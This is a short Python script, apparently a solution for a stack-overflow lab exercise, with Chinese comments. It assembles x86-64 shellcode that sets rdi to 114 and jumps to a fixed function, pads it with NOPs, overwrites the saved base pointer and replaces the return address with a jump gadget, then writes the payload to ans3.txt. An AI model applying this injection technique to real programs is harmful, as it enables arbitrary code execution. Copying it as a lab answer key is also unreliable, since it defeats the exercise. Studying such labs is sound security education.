import struct

# 1. 编写 Shellcode
# 目的：rdi = 114; jmp 0x401216 (func1)
shellcode = b'\x48\xc7\xc7\x72\x00\x00\x00'  # mov rdi, 0x72
shellcode += b'\x48\xc7\xc0\x16\x12\x40\x00' # mov rax, 0x401216
shellcode += b'\xff\xe0'                     # jmp rax

# 2. 填充 Buffer (32字节)
# 前部分是 Shellcode，后面用 NOP (0x90) 填充
padding_len = 32 - len(shellcode)
payload = shellcode + b'\x90' * padding_len

# 3. 覆盖 Saved RBP (8字节)
payload += b'B' * 8

# 4. 覆盖返回地址 -> jmp_xs (0x401334)
jmp_xs_addr = 0x401334
payload += struct.pack("<Q", jmp_xs_addr)

with open("ans3.txt", "wb") as f:
    f.write(payload)
print("Payload written to ans3.txt")